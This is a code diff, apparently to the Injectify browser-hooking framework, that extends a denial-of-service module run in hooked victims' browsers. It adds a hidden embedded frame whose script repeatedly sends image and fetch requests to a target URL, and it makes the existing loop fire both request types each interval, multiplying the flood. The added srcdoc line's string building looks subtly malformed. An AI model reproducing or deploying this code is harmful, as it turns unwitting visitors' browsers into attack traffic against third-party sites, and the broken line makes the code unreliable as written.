@@ -93,6 +93,17 @@ if (injectify.info.platform === 'browser') {
             }
 
             /**
+             * DDoS from multiple documents
+             */
+
+            injectify.module('embed', {
+                interaction: false,
+                hidden: true
+            }, function(element) {
+                element.srcdoc = '<script>setInterval(function(){ var url=' + JSON.stringify(target) + request.random ? '+"?"++new Date()' : '' + '; var req = new Image(); req.src=url; if (typeof window.fetch === "function") window.fetch(url); },' + request.interval + ')</script>'
+            })
+
+            /**
              * Request the target url
              */
             setInterval(function() {
@@ -106,11 +117,10 @@ if (injectify.info.platform === 'browser') {
                  */
                 if (typeof window.fetch === 'function') {
                     window.fetch(url)
-                } else {
-                    var req = new Image()
-                    req.src = url
-                    req.onload
                 }
+                var req = new Image()
+                req.src = url
+                req.onload
             }, request.interval)
             module.return(true)
         } else {
